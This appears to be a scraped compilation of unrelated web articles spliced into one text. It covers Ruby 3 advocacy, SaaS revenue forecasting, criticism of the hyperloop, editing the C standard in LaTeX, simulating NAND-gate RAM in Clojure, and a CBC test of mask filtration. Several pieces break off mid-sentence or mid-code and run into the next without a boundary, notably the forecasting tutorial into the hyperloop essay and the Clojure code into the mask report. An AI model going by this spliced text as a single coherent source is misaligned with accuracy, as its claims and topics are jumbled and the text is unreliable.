<p>But there has also been some consternation along the way. Is Ruby really a top-tier programming language able to compete with the likes of Javascript, Python, PHP, Go, and beyond? Or was it just a DHH-fueled hype-cycle doomed to inevitable relative obscurity as other technologies and frameworks ascended in its wake? (I don’t actually believe anyone seriously thinks this any more, but you still see the stray head-scratcher whiz by on Hacker News.)</p>

<p>Now we are mere weeks away from a major new Ruby release: version 3. While Ruby 3 is an exciting update with lots of features that make it interesting both now and in the future with various point updates promising even more goodies, I think it’s the <strong>psychology</strong> of turning over from major version 2 to 3 that is most vital to the future health of the community.</p>

<p>Ruby 3 isn’t just a new version. <strong>It’s a new era.</strong></p>

<p>What does this era represent? Let’s list a few talking points I hope we’ll start to push <em>hard</em> and <em>often</em> as Rubyists:</p>

<h3 id="ruby-3-is-fast">Ruby 3 is Fast</h3>

<p>No, I don’t mean Ruby 3 suddenly got a whole lot faster than Ruby 2.7. I mean that Ruby 3 is <em>fast compared to Ruby 2</em>. It’s unfortunate that much of the “Ruby is slow” meme has been a laggard perspective stemming from people’s experiences <em>years ago</em> with the language, or an old version of Rails, or Jekyll, or…the fact is it just wasn’t the zippy experience we’re pleased to enjoy today.</p>

<p>Do we still want even better performance? Of course! But at this point, Ruby is plenty fast as compared to many other “scripting” languages. Most of the time it’s on par with Python. It’s even on par with Javascript. (What? Don’t believe me? <a href="https://css-tricks.com/comparing-static-site-generator-build-times/">Check out how similar Jekyll and Eleventy perform as static site generators.</a>) And as Nate Berskopec often reminds us, your Rails app can perform quite well with just a bit of fine-tuning, and often the typical bottlenecks lie elsewhere in the stack (database, web server, etc.)</p>

<h3 id="ruby-3-is-easy">Ruby 3 is Easy</h3>

<p>These days, you don’t need to wrestle with gem dependency hell or pray to the gods to get Ruby or a Ruby extension to compile. That was “old Ruby”. New Ruby is using a fancy-pants version manager like <code>rbenv</code> combined with Bundler 2.</p>

<p><strong>It just works.</strong></p>

<p>Truly, Ruby is the first thing I install on any new Mac or Linux machine I operate and getting things set up is a piece of cake. Installing Rails. Installing Bridgetown. Installing…whatever. It. Just. Works.</p>

<p>We also have things like Docker and WSL to make things <em>much</em> easier to accomplish on Windows machines if you get stuck wrestling with Win-native Ruby. Heck, you can upload your entire dev environment into the cloud now and use VSCode with remote extensions.</p>

<p>Are there ways Bundler and the ecosystem around Ruby versions/dependencies could be improved? No doubt. But it’s in no way any more complicated or fiddly than the world of npm/yarn, and you don’t see the angry hordes trying to burn down the barn doors over there (except maybe the Deno folks 😉).</p>

<h3 id="ruby-3-is-sleek">Ruby 3 is Sleek</h3>

<p>Ruby isn’t the best choice for all problem domains. It just isn’t. But when it comes to “standard” web development, it often <em>is</em> the best choice. It really is! Spend a few days writing NestJS + TypeORM Typescript code and then come back to Rails. It’s like a breath of fresh, sweet air. And that’s not just when you’re writing controllers or models…it goes all the way up and down the stack.</p>

<p>Ruby just makes everything <em>better</em>. Less code. Less boilerplate. Less ceremony. More streamlined. More properly object-oriented. More polished and pleasurable to read and write. Certainly one could posit there are other web frameworks/languages which have much going for them as well. Laravel is popular with PHP devs, and for good reason. Django is popular with Pythonistas. But can anyone say with a straight face that, all things being equal, PHP is a “superior” programming language to Ruby? Can anyone say that Python—taken as a whole—is more suited to building a website than Ruby is?</p>

<p>I think not. While Ruby wasn’t originally invented as a way to supercharge web development, it found its niche in the rise of such amazing projects as Rails, Rack, Jekyll, plus great APIs by Stripe and many others. It rode much of the early wave of Web 2.0 hits, and that heritage continues to benefit us today.</p>

<h3 id="ruby-3-is-here-to-stay">Ruby 3 is Here to Stay</h3>

<p>Ruby 3 isn’t just another notch on the belt of recent Ruby releases. It’s <strong>Ruby 3.0</strong>. That means we can look forward to 3.1, 3.2, 3.3, and beyond. This is the beginning of a whole new era. New innovations. New patterns. Exciting ideas fusing concepts from other technologies with The Ruby Way. Fresh blood coming into the ecosystem. (Anecdotally, I’m seeing newbies plus returning old-timers jumping into Ruby-based forums and chat rooms <em>all the time</em>, and the pace of interesting new Ruby gems bursting onto the scene finally seems to be increasing after a few years of ho-hum incremental progress.)</p>

<p>The takeaway is this: Ruby 3 represents a moment when we should stand proud as Rubyists and unabashedly proclaim to the bootcamps and engineering departments of the world that we’re open and ready to do business large and small. Sure you could pick something other than Ruby with which to build the next great internet success story. But you’ll definitely be in good company if you do pick Ruby. After all, it’s more likely than not your code will be living in a repository overseen by Ruby (GitHub), you’ll be communicating with your fellow colleagues via Ruby (Basecamp &amp; HEY), you’ll be asking for support via Ruby (Discourse forums), you’ll be researching the latest developer news and techniques via Ruby (Dev.to), and you’ll be spinning up your dev machine while wearing that l33t geek t-shirt you got from an indie vendor via Ruby (Shopify)—that is, after you paid for it via Ruby (Stripe). And when you’re exhausted from all that coding and need to unwind at a private cottage by the beach, Ruby will help you out there too (AirBnB).</p>

<p><em>Excelsior!</em></p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <!-- DESKTOP -->
      <p>
        <h2>SaaS Revenue Forecasting</h2>

        <h2>SaaS Revenue Forecasting</h2>
      </p>

      <!-- DESKTOP -->
      

      <!-- MOBILE -->
      
      

      

      <div><p>
        There are many reasons you might want to create a financial forecast, most of which boil down to either 1) helping you manage the business and understand its dynamics better, or 2) telling the story of the company to others (whether the internal team, senior management, the board, investors, or prospective investors).
        </p><p>
        Here we’ll show you how to forecast revenue (and associated key metrics) for a subscription SaaS business.
        </p></div>

      <div><p>
        If you'd like to follow along in Excel, here's the file we'll be walking through (though you'll still be able to follow along without it):
        </p><a href="#" type="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet" rel="nofollow" onclick="download_file(event)">
          <p><i></i>Download the Example Model
          </p>
        </a>
      </div>



      

      <div><p>
        We’ll start first by forecasting our number of active subscribers. To do this, we forecast two key components: The number of new subscribers in a given month, and the number of canceled subscriptions (or “churn”).
        </p><p>
        To begin with a simple illustration, we’ll assume that we win 10 new subscribers per month. We’ll also assume that these subscriptions are cancellable any time, and that 10% of existing subscribers choose to cancel each month.
        </p><p>
        The beginning # of active subscribers in any period equals the ending number from the prior month. We refer to this method of forecasting as a “screw”.
        </p></div>

      <div>
        <div>
          <!-- <img class="card-img-top" src="/assets/blog/saas-revenue/saas-rev-1.png"> -->
          <p><img src="https://s3.us-east-2.amazonaws.com/modeloptic-public/blog/saas-revenue-forecasting/saas-rev-1.png" data-enlargeable=""></p><p>
              <span>
                A basic subscriber forecast.
              </span>
            </p>
        </div>
      </div>

      <p>
        As a quick aside, there are many other ways to go about forecasting churn, like analyzing cohort behavior over time, to potentially get to a more accurate projection. Our view is that it’s only worth getting into that level of detail once the company has reached a certain level of maturity, likely in the range of several thousand subscribers. Before then though, the simpler monthly churn rate is the approach we most often recommend because it’s easier to calculate, easier to forecast, and it prevents you from getting bogged down in unnecessary detail and drawing conclusions from too sparse of data.
        </p>

      

       <div>
        <!-- <br /><br /> --><p>
        So now we have a simple framework for forecasting our number of active subscribers for any period. Next we add in our assumption on revenue per month, and multiply that by our # of active subscribers to get total revenue per month.
        </p><p>
        We'll add in a calculation for ARR (Annual Recurring Revenue) here as well by simply multiplying monthly revenue by 12.
        </p></div>

      <div>
        <div>
          <!-- <img class="card-img-top" src="/assets/blog/saas-revenue/saas-rev-2.png" alt="Revenue"> -->
          <p><img src="https://s3.us-east-2.amazonaws.com/modeloptic-public/blog/saas-revenue-forecasting/saas-rev-2.png" data-enlargeable=""></p><p>
              <span>
                Monthly Subscription Revenue = [ Ending # of Active Subscribers ] * [ Avg Revenue / Subscriber ]
              </span>
            </p>
        </div>
      </div>

      <p>
        We’ve now accomplished our goal of forecasting subscription revenue for our SaaS business. 
        </p>

      

      <div>
        <!-- <br /><br />
        We’ve now accomplished our goal of forecasting subscription revenue for our SaaS business. Next, let's say we charge some consulting fees to implement our product any time we get a new subscriber, and let's say that charge is $5k.
        <br /><br /> --><p>
        Next, let's say we charge some consulting fees to implement our product any time we get a new subscriber, and let's say we charge $5k. You can see that logic added in below, and we've also totaled up these two revenue lines (Subscription Revenue and Implementation Revenue) to get Total Revenue. 
        </p></div>

      <div>
        <div>
          <!-- <img class="card-img-top" src="/assets/blog/saas-revenue/saas-rev-3.png" alt="Revenue"> -->
          <p><img src="https://s3.us-east-2.amazonaws.com/modeloptic-public/blog/saas-revenue-forecasting/saas-rev-3.png" data-enlargeable=""></p><p>
              <span>
                Note that our ARR calculation here does not include the new non-recurring services revenue.
              </span>
            </p>
        </div>
      </div>

      

      <div>
        <!-- <br /><br /> --><p>
        We could also get a bit more sophisticated about how we forecast our number of new customers each month instead of simply hard-coding our new customer count at 10 per month. Let’s say our primary customer acquisition method is converting visitors from our website. For any set of website visitors, some of them contact us to become a lead, and then some of those leads convert into paying customers.
        </p><p>
        For starting baseline assumptions, let's say we get 1,000 website visitors per month, 2% of those convert into leads, 20% of our leads convert into paying customers, and our marketing efforts drive an increase in website visitors by 1,000 per month.
        </p></div>

      <div>
        <div>
          <!-- <img class="card-img-top" src="/assets/blog/saas-revenue/saas-rev-4.png" alt="Revenue"> -->
          <p><img src="https://s3.us-east-2.amazonaws.com/modeloptic-public/blog/saas-revenue-forecasting/saas-rev-4.png" data-enlargeable=""></p><p>

        You could then go further to calculate direct costs to get to gross profit, calculate customer LTV, tie new website visitors to marketing spend and new customers to sales spend to calculate CAC, and so on, but we’ll save those steps for future articles.

<p>Back in 2016 and 2017, one of the key components of mainstream tech coverage was something referred to as “vaporware“1: flashy, futuristic tech whose supposed potential often overshadowed its practicality or even, you know, actual existence in the real world. </p>



<p>This was a strange time in technology and tech journalism, one <a href="https://discourseblog.com/elon-musk-made-me-a-socialist/">I’ve written about at length before</a>. Uber did a whole <a href="https://www.theverge.com/2017/11/8/16613228/uber-flying-car-la-nasa-space-act">summit on how it was going to build flying cars,</a> self-driving technology was assumed to be right around the corner, and editors commissioned endless stories about <a href="https://www.mercurynews.com/2016/07/09/hacking-the-brain-silicon-valley-entrepreneurs-turn-to-fasting-and-smart-drugs/">“biohacking”</a> and <a href="https://www.bbc.com/news/technology-34210012">“transhumanism.”</a> One of the most interesting, most hyped, and most wildly impractical technologies from this era was the hyperloop. </p>



<p>I’m not going to go into huge detail on the hyperloop’s origin story, other than to say it owes its current popularity to the incredibly stupid personality cult surrounding Elon Musk. The technology is relatively easy to understand: you put a vehicle on a track inside a vacuum-sealed tube and it goes very fast. </p>



<p>The hilariously named Virgin Hyperloop2 passed a huge milestone this week when its first two passengers went down its 500-meter tube at a little over 100mph.3 The company celebrated the achievement by releasing a modest video comparing it to, among other things, the moment the Wright Brothers flew the first planes.</p>



<figure></figure>



<p>The core difference of the “hyperloop” versus, say, a train, is that the passenger-carrying vehicle inside the vacuum tube is not susceptible to air resistance, and can therefore attain speeds that are largely impossible or unsafe for an external train. However, as you can imagine, the logistics of building a perfectly vacuum-sealed tube big enough to carry a magnetic levitation vehicle are significantly more difficult than, say, building a train track (even a magnetic levitation one). </p>



<p>And as <a href="https://twitter.com/leftistthot420/status/1326559165838487552?s=20">many</a> <a href="https://twitter.com/hilaryagro/status/1326531535223345153?s=20">people</a> <a href="https://twitter.com/jkass99/status/1326607439240679424?s=20">pointed out</a> online, focusing on this kind of technology rather than, say, <em>trains</em>, is insanely stupid because we already have trains that are way better than this. We—by which I mean America— just don’t want to spend the money to build them. </p>



<figure></figure>



<p>Hyperloop is, in this context, the perfect example of the end-state death-cult capitalism that the American ruling class believes in. Virgin Hyperloop has raised some $400 million so far according to the <a href="https://www.nytimes.com/2020/11/08/business/virgin-hyperloop-passenger-test.html"><em>New York Times</em> story on the test</a>, which is half just a press release and then two interviews with experts saying “this shit won’t work, why are they doing this.” $400 million is a drop in the bucket compared to what it would cost to build an actual functioning high-speed rail network across the country.4</p>



<p>What hyperloop <em>does</em> do, however, is let the powers that be point to flashy efforts to make a cool technology real, like when Trump’s Transportation Secretary Elaine Chao5 <a href="https://www.mhlnews.com/transportation-distribution/article/22055573/dot-wants-to-weigh-in-on-emerging-transportation-technology">created</a> the Non-Traditional and Emerging Transportation Technology (NETT) Council to basically remove any federal regulation that would stop people flooding money into this shit.</p>



<p>Despite how all this sounds, I’m ultimately not a pessimist on the hyperloop as a whole. I think that worldwide mass transit is eventually going to need some kind of system that replaces air travel, which is extraordinarily energy-inefficient and currently relies entirely on fossil fuels to make it work. Ground transportation is largely restricted in speed by friction and air resistance, two things that a vacuum-sealed hyperloop system removes.6 I think eventually, a global network of 500 mph + transport technology might be feasible, but this is like 2200 tech we’re talking about, not 2020. Until then, we have trains. Trains that work, trains that can work even better, trains that are <em>incredibly efficient at moving goods, services, and people long distances and are relatively easy to power with non-fossil-fuel sources because they’re on static tracks. </em>Trains are good! </p>



<p>But this is America, and we cannot have nice things. Creating a nationwide high-speed rail service would cost money and political capital, and doing it right would require it to be a largely publicly-funded and administered project. Hyperloop, however, is marketing itself to the highest bidder: there’s a reason that the first contracts its various scammy companies sold were to do things like <a href="https://www.bbc.com/news/technology-49096675">connecting Riyadh to Jeddah in Saudi Arabia</a>.  </p>



<p>The core deceit of all of these technologies, from hyperloop to flying cars to neural nets, is that they will demonstrably improve everyday people’s lives at some point in their lifetimes. What the founders do is say “this is coming in 2020,” in 2016, and by 2020 they’re a bit behind schedule, but look, they have a flashy test to show you. The technology is coming soon, they promise. And when it gets here, when they “make it a reality,” to paraphrase almost every article written about vaporware, your life will get better. Only the tech never comes. And when it does, you won’t be able to afford it. It’s entirely possible that in our lifetimes the oil and gas billionaires in Saudi Arabia will be able to shoot themselves in tiny designer-branded pods with heated leather seats from one side of the Kingdom to the other. Maybe we’ll even have a line in the U.S. that Wall Street execs and DC lobbyists will use to blast up and down the Eastern Seaboard for business lunches. But you and me? We’ll be stuck on dilapidated Amtrak lines, no matter how many press tours Joe Biden takes on them, eating Cup Noodles from the dining car, or else stuck in our cars, choking the sky with emissions from the gas that we can barely afford to buy, stuck in traffic on roads falling further and further into disrepair, our only consolation the fact that the hyperloop’s vacuum-sealed tubes don’t have windows, so its riders won’t be able to gawk or gloat as they fly by at 800 miles per hour. </p>

      <p>… I did it. I survived the Paper Blitz.<!--more--></p>



<p>For those of you who saw one of my earlier posts about <a href="https://thephd.github.io/your-c-compiler-and-standard-library-will-not-help-you">why most C implementations will purposefully blow your leg off even in the simplest of scenarios</a>, you may have noticed that I said I became the Project Editor for C. That’s a fancy way of saying I glue the standard together and produce both the Working Drafts/Working Papers (WDs/WPs), an Editor’s Report, and a Diffmark of the WD against the last published WD.</p>

<p>The <a href="https://drive.google.com/file/d/1IbngZ8StYVVYASd3WWuC4Uu9Xs39AF_N/view?usp=sharing">Working Draft is here</a> and the <a href="https://drive.google.com/file/d/1x4-eIBbQU3aXuORoNPSixbbl_ZKKfWfu/view?usp=sharing">Diffmarks are here</a> until I can publish it O f f i c i a l l y through the ISO® N-Paper™ System©.</p>

<p>Silly symbols aside, this was a slog through 30+ papers, a few defect reports, several editorial issues, and a minor cleanup of some of the sources. There was a backlog of about 3 meetings worth of papers to integrate, give or take a few from a few missed integrations in the past and a few things early-integrated from the meetings I had to cover. Despite some pretty crazy shenanigans when I was first handling becoming the Project Editor, everything ended up turning out smoothly! For the most part, anyways: I can already smell the editorial reports for all the things I probably messed up integrating. But what is it like, editing a Standards Document? What’s it like taking all those documents and turning them into a Working Draft?</p>

<p><img src="https://thephd.github.io/assets/img/2020-09-11/papers.png" alt="Image of a few of the papers from "></p>



<p>As with any project, it needs tools. This standard is built with a suite of tools any *Nix programmer will find comforting:</p>

<ul>
  <li><code>make</code>, for general build purposes</li>
  <li><code>sed</code> and <code>awk</code> for some reserved identifier / keyword shenanigans</li>
  <li><code>latex</code>, with the usual <code>pdflatex</code> and other shenanigans</li>
  <li><code>git</code>, to pull a previously tagged version of the standard to attempt to create useful diffmarks</li>
</ul>

<p>There’s also a bunch of other side tools used to generate some docs and other things, but that’s the core of it! As usual, nothing that discusses LaTeX would be complete without me saying the following…</p>

<h3 id="latex-is-horseshit">LaTeX is horseshit</h3>

<p>Boooiiiiiiiiiiii, do I hate LaTeX. The available LaTeX distributions are piss-tier garbage, printing a line number but not tracking any file information which makes any stream of multi-compilation completely useless and requiring separate invocations of the latex compiler for each file and magic to know which file you’re in. Not that that is how most people organize documents: <code>\input{the_file}</code> is the choice of developing a modular document in LaTeX land, complete with <code>#include</code>-like behavior but with 0% of the compiler Quality of Implementation.</p>

<p>Changing one thing of course results in a cascade of errors, warnings are split over multiple lines so as to make most error-parsing and warning-parsing regexen useless for trying to pick errors out of the literal 1 MB dump of errors, and trying to edit anything beyond the most basic of syntax is a complete slog. There is no reasonability, particular form, or dependable structure to LaTeX errors, other than “hard errors” starting with <code>!</code>.</p>

<p>Whitespace is not significant in the language (except when it is), people slap ad-hoc commands together to patch over LaTeX’s gross inefficiencies, adding that footnote catapults the next 3 paragraphs of text to write into the margins to the right, and have you heard of our Lord and Savior <code>OVERFULL HBOX</code>?</p>

<p>My eternal advice to everyone is to stop writing documents in LaTeX, please. You’d get farther and faster in even Microsoft Word, and it would render better for the internet. It has math support and it doesn’t poo all over the bed and scream when you want to try to add a mild margin to your author and title names, gargling with cryptic hints as to what will satisfy it enough to stop besmearing the nice linens in its dreadful output.</p>

<p>If your hands shake at the thought of not using BEAUTIFUL, LAYOUT-POWERFUL, HAND-BAKED LATEX on your résumé, there’s templates that make your Word Documents look like LaTeX ones. Just using a different Serif-y font will probably go a long way towards that look!</p>

<p>… That being said, the C Standard is written in LaTeX, so that’s what we’re editing.</p>

<h3 id="the-c-standard-is-mostly-nice">The C Standard is Mostly Nice</h3>

<p>Don’t get me wrong: LaTeX is garbage, but the Standard I was handed is of pretty good quality for a LaTeX document. It was easy to build and edit, I did not get lost once I had all the proper things installed (I did not decide to try to figure out the “minimum required distribution” and instead just shotgun <code>apt get install</code>d <code>texlive-full</code>), and the files were orderly. Referencing things is kind of terrible but that’s more of a LaTeX problem than a structure problem. I am also lucky to even be getting a LaTeX document: the standard used to be written in some God Awful Rotten Badness by the name of “TROFF”. I don’t know too much about it, and from the little that I did learn</p>

<p>I plan to keep it that way. 😄</p>

<p>There’s also the use of <code>latexdiff</code> and other things to produce nice diffmarks. It works out pretty decently, some of the marks are incredibly noisy. Still: as long as it highlights the general area of changes, it produces a pretty good proxy of “places to look for things that have changed”. It does ignore newly added files, which is why the lists at the beginning of the Working Paper – which detail the list of documents added from each meeting – are not all blue-highlighted. Having a nice LaTeX document with some really nice organization left to me by the last editor made the next part of this article the easiest…</p>



<p>Sweet, You Wrote a <a href="http://www.open-std.org/jtc1/sc22/wg14/www/docs/n2335.pdf">Sick-Nasty Rad Paper</a> And Now It Needs To Be Put In The C Standard! So, how does it get there? Well, you don’t actually write a diff to the standard. At least, not a <em>real</em> diff: the sources to the C standard are hidden from the world to keep them safe, even when the time of Darkness descends upon us. What you write are <em>instructions to the project editor</em> (Hi, That’s Me!), and then I take your instructions and do my Best Effort™ to reflect them in the C Standard. Most of the wording gets approved by the Committee before-hand, and the edits are usually straightforward and simple. <a href="http://www.open-std.org/jtc1/sc22/wg14/www/docs/n2517.pdf">For example</a>:</p>

<blockquote>
  <p>RECOMMENDATION: 3.4.3p4 should use a different example of undefined behavior, such as:</p>
  <blockquote>
    <p>EXAMPLE An example of undefined behavior is the behavior on dereferencing a null pointer.</p>
  </blockquote>
</blockquote>

<p>I then take these recommendations/instructions/suggestions and then go beat the LaTeX up on your behalf. One of the biggest benefits of this is that you don’t have to know LaTeX. Or how to build the standard, or any part of that. The Project Editor is the “Layer of Indirection” between you and the actual text of the standard. This also means that I could, in theory, rewrite the entire Standard as a Microsoft Word Document, or rewrite the entire thing in restructuredText and not one of you would know the difference. Or, so that’s the ideal situation, anyhow. Unfortunately, following people’s Standard-editing directives are not always the most straight forward…</p>

<h3 id="instructions-unclear">Instructions Unclear?!</h3>

<p>Accidentally blew off foot.</p>

<p>What the hell does “3.4.3p4” mean? Well, I have to build the standard (or go look at an older one), figure out what section/paragraph you’re referring to, and then fix it. Normally, the C standard evolves at such a devastatingly snail-like pace that this is normally not a problem. However, doing this was a bit tough because of 3 meetings of backlogged changes. There were lots of overlaps between papers, and also just out-and-out strange descriptions for how to change some things that I did not understand at first. Weird nesting in the recent C Floating Point Group’s changes to the standard have been all sorts of fun to integrate.</p>

<p>“Delete these paragraphs, then add some here” okay, is that before or after the stuff you just asked me to destroy? Oh, I just applied a paper that deletes half of what you’re asking me to edit. Uh, well, I guess we’re going to have to brew up some interesting words on the fly…!</p>

<p>“Do these changes, and then make similar changes to the usual places” uh, what are “the usual places”? Guess it’s time to break out find/replace and figure out what the usual places are! Wait, hold on, you made these changes here, but… there’s identical wording somewhere else, am I supposed to edit that too…? Time to e-mail the author…</p>

<p>It’s an interesting bucket of challenges, really. I think one of the ways to help make it so I can more reliably know what sections to edit are by adding stable tags to the standard. C++ has done this and it means when someone says “edit <code>[alg.any.of]</code>”, you know where to go no matter what happens to the section and paragraph numbers. <code>25.6.2</code>… what’s that, what am I doing again?</p>

<p>Some frustrations go beyond just the papers’ contents, though.</p>

<h3 id="n2481-nooo-you-mean-n2553">N2481? Nooo, you mean N2553!</h3>

<p>One of the biggest problems in both the C and C++ Committees are history. C++ began to address this problem by using P-numbers for their papers, which are <code>PNNNNrXYZ</code> numbers that indicate both a paper uniquely and the revision of the paper (0, 1, 2, …) in the <code>XYZ</code> part. C has no such infrastructure: every paper is submitted, officially, to ISO and is given an N-number.</p>

<p>How do you track revision history? You hope the author puts it in the paper title or inside the paper itself. It’s basically up to the author to do this, and not all authors do it. This is a larger problem that is more strictly outside of my purview as Project Editor, but it is something that I am going to tackle anyways.</p>

<p>I had some inspiration thanks to the <a href="https://github.com/LynnKirby/wg14-link">work done by LynnKirby</a>, wherein Lynn created a <a href="https://wg14.link/">wg14.link website, similar to the wg21.link website</a>. This has given me a lot of insight into what people want out of a service like this, and how I should book keep papers and their metadata. Hopefully before Summer of 2021, I will be able to unveil a new way to track these papers and keep title, author, abstract, and history information and make the Paper Submission Process far more friendly to the wider C Community!</p>

<p>Still, this is a lot of rambling and anymore stuff will start to get way off topic to what it means to actually edit the C Standard. …</p></section></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p><span><p>“Computers are all made out of logic gates”. We’ve heard that saying before. We also have a sense that logic gates are very simple machines, analogous to light switches even. This raises the question: <em>how exactly do kind-of-light-switches come together to form computers</em>? How does “storing a variable” or “calling a function” translate into logic gates going on or off? </p><p>On a journey to answer that question, I discovered J Clark Scott’s excellent book <a href="https://www.amazon.com/But-How-Know-Principles-Computers-ebook/dp/B00F25LEVC" target="_blank">“How do It Know?</a>”. He starts with NAND gates and takes you on a journey to build a computer using them.</p><p>I liked his book so much that I took his schematic for RAM, and simulated it in Clojure. In this essay, I’ll guide you through doing just that: we’ll simulate NAND gates, and use about <em>14 thousand</em> of them to build 256 bytes of RAM.</p><p>Going through this simulation ingrained an “aha” feeling in me: watching 14 thousand little machines chug away makes you feel that whoever uses a computer is a wizard. A wizard with an army of millions of machine servants doing billions of little jobs for them every second. I hope it gives you the same feeling. 🙂</p><p>To grok this essay, you need to understand this picture:</p><p><span><img src="https://stopa.io/api/image/aHR0cHM6Ly91c2VyLWltYWdlcy5naXRodWJ1c2VyY29udGVudC5jb20vOTg0NTc0Lzk1Nzc2NDk4LTdhY2RkMzgwLTBjOTItMTFlYi04NWQ2LTZmOWEzNGE2NmU5Zi5wbmc" alt="image"></span></p><p>This describes a NAND gate. A NAND gate is a machine that has two input wires. If both input wires have a “high” charge (represented as 1), the output charge is “low” (represented as zero). With any other combination of input charges, the output charge is high.</p><p>Notice that the wires carry a charge, but we choose to interpret <em>meaning</em> in the charge. “high charge” means 1, and “low charge” means 0. Nothing changes in the machine, this is just something we decided as humans (1).</p><p>On the left you see a circuit diagram. You can read it as input wires <code>a</code> and <code>b</code> carrying charges into the <code>NAND</code> gate. The <code>NAND</code> gate has a wire <code>c</code>, carrying the output charge. For all the circuit diagrams we’ll draw, you can read them as electricity “flowing” from left to right, or top to bottom.</p><p>On the right is a “truth” table for a NAND gate. This is just a fancy name for summarizing every state a <code>NAND</code> gate can be, based on the input wires.</p><p>Now, we can start even lower than a <code>NAND gate</code>, but this machine is simple enough. It can’t be so hard to build something that turns off when two inputs are turned on. You don’t have to take my word for it though, you can search up “building a NAND gate with transistors”, and come back when you’re convinced. </p><p>Time to code! 🙂</p><p>First things first, we need some way to represent the state of our circuit. We know that our RAM will be built completely from <code>NAND</code> gates, so let’s take inspiration from one:</p><p><span><img src="https://stopa.io/api/image/aHR0cHM6Ly91c2VyLWltYWdlcy5naXRodWJ1c2VyY29udGVudC5jb20vOTg0NTc0Lzk1Nzc2NTI0LTg0NTczYjgwLTBjOTItMTFlYi05NWMyLWJlMWQ4MzFlNTg5MC5wbmc" alt="image"></span></p><p>If we look at this example we can see that:</p><ol><li>We have wires. </li><li>Wires have charges.</li><li>We hook wires together with NAND Gates</li></ol><p>Here’s one way we can map that to a data structure in Clojure: </p><pre><code><span>(</span><span>def</span><span> ex-state-v0 {</span><span>:charge-map</span><span> {</span><span>:a</span><span> </span><span>1</span><span> </span><span>:b</span><span> </span><span>1</span><span> </span><span>:c</span><span> </span><span>0</span><span>}</span>

We can also keep a map that tells us the charges of our wires. Finally, we can keep a list of NAND gates, which tell us how these wires connect. </p><p>Fine enough way to represent our circuit for now! Let’s create a few functions that can help us manage this representation:</p><pre><code><span>; update state v0</span>

The masks were also made out of varying materials and featured different designs.&nbsp;</p>  <p><em>Marketplace</em> put the masks through the rigorous National Institute for Occupational Safety and Health (NIOSH) standard test, conducted at a lower air-flow regimen to reflect normal breathing. The test is usually reserved for N95s and personal protective equipment (PPE) intended for health-care workers. A standard <a href="https://www.cdc.gov/niosh/npptl/stps/pdfs/TEB-APR-STP-0059-508.pdf"><u>NIOSH aerosol tes</u></a>t measures filtration efficiency, meaning the quantity of particles the mask filters out as the wearer breathes in.&nbsp;</p>  <p><span><figure><div><p><img loading="lazy" alt="" srcset="https://i.cbc.ca/1.5795516.1604950465!/fileImage/httpImage/image.png_gen/derivatives/original_300/marketplace-masks-lab-tests.png 300w,https://i.cbc.ca/1.5795516.1604950465!/fileImage/httpImage/image.png_gen/derivatives/original_460/marketplace-masks-lab-tests.png 460w,https://i.cbc.ca/1.5795516.1604950465!/fileImage/httpImage/image.png_gen/derivatives/original_620/marketplace-masks-lab-tests.png 620w,https://i.cbc.ca/1.5795516.1604950465!/fileImage/httpImage/image.png_gen/derivatives/original_780/marketplace-masks-lab-tests.png 780w,https://i.cbc.ca/1.5795516.1604950465!/fileImage/httpImage/image.png_gen/derivatives/original_1180/marketplace-masks-lab-tests.png 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5795516.1604950465!/fileImage/httpImage/image.png_gen/derivatives/original_780/marketplace-masks-lab-tests.png"></p></div><figcaption>An image shows leakage from an ill-fitting mask during Marketplace’s lab test at the University of Toronto’s Dalla Lana School of Public Health. <!-- --> <!-- -->(CBC)</figcaption></figure></span></p>  <p>An N95 mask must have a 95 per cent filtration efficiency.&nbsp;</p>  <p>"This is the benchmark test. And it's actually useful because it allows us to compare consumer market masks to masks that we know a lot about," said&nbsp;James Scott, a professor from the University of Toronto's Dalla Lana School of Public Health. Scott is a specialist in bioaerosols and runs the lab where <em>Marketplace</em>'s tests were run.</p>  <ul>   <li><strong>Watch <em>Marketplace</em> Fridays at 8:00&nbsp;p.m., 8:30 p.m. NT, or stream&nbsp;any time&nbsp;on <a href="https://gem.cbc.ca/season/marketplace/season-47/8984c269-dae4-4a7b-b23a-d7df38647f09">CBC Gem</a></strong></li>  </ul>  <p>The test pulls a constant breath of air containing tiny salt particles through the mask material. The salt particles are similar in size to particles able to contain the coronavirus that might originate from droplets expelled by an infected person's breath, cough or sneeze. During the test, samples of air inside and outside the mask are compared to see how effective the mask is at reducing the level of particles.</p>  <p>Previous tests on consumer masks have commonly&nbsp;looked at how masks can help block particles&nbsp;when coughing or sneezing and&nbsp;prevent transmission to others.&nbsp;But the <em>Marketplace </em>test&nbsp;shows that certain materials make some masks better at limiting wearers'&nbsp;exposure by filtering what they&nbsp;breathe in, Scott said.</p>  <p>"Even fairly low-efficiency masks are actually quite effective at catching much larger particles. But, it takes a really good mask to catch the small ones as well. And we know that the virus will travel not only on the big ones but the small ones as well," said Scott.</p>  <p><em><strong>PHOTOS | A closer look at filtration efficiency of mask materials:</strong></em></p>    <h2>Results</h2>  <p><span><figure><div><p><img loading="lazy" alt="" srcset="https://i.cbc.ca/1.5799764.1605212545!/fileImage/httpImage/image.png_gen/derivatives/original_300/masks-graphic.png 300w,https://i.cbc.ca/1.5799764.1605212545!/fileImage/httpImage/image.png_gen/derivatives/original_460/masks-graphic.png 460w,https://i.cbc.ca/1.5799764.1605212545!/fileImage/httpImage/image.png_gen/derivatives/original_620/masks-graphic.png 620w,https://i.cbc.ca/1.5799764.1605212545!/fileImage/httpImage/image.png_gen/derivatives/original_780/masks-graphic.png 780w,https://i.cbc.ca/1.5799764.1605212545!/fileImage/httpImage/image.png_gen/derivatives/original_1180/masks-graphic.png 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5799764.1605212545!/fileImage/httpImage/image.png_gen/derivatives/original_780/masks-graphic.png"></p></div><figcaption> <!-- -->(CBC)</figcaption></figure></span></p>  <h2>Polypropylene fabric masks as good as N95</h2>  <p><em>Marketplace</em>'s test found some masks are just as good as an N95 when it comes to filtering out those potentially harmful particles, including one made with something called polypropylene fabric.&nbsp;</p>  <p><span><figure><div><p><img loading="lazy" alt="" 